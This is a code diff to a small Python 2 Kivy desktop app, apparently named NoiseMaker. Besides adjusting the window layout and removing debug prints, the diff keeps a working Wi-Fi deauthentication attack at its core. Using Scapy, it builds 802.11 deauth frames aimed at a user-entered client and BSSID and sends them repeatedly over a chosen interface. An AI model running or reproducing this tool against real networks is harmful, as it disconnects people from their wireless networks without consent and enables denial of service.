@@ -5,28 +5,31 @@ import kivy
 kivy.require("1.9.0")
 from kivy.app import App
 from kivy.uix.gridlayout import GridLayout
+from kivy.uix.floatlayout import FloatLayout
+from kivy.config import Config
 
-class NoiseMakerFunc(GridLayout):
+Config.set('graphics','height','500')
+Config.set('graphics','width','1000')
+Config.set('graphics','resizable','0')
+
+
+
+class NoiseMakerFunc(FloatLayout):
     def SendPacket (self):  
-        print "Function is called"
         try:
-            print "one"
             client = self.ids.target.text
             nssid = self.ids.ssid.text
             count = self.ids.decount.text
             conf.iface = str(self.ids.iface.text)
-            print client + ":" + count + ":" + nssid + ":" + conf.iface
+            
             conf.verb = 0
-            print "two"
+            
             packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7)
-            print "three"
             for n in range(int(count)):
                 try:
-                    print "four"
                     sendp(packet)
-                    print "four point five"
                     print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
-                    print "five"
+                    self.ids.resultOutput.text = 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
                 except Exception, d:
                     print d
         except Exception, c:
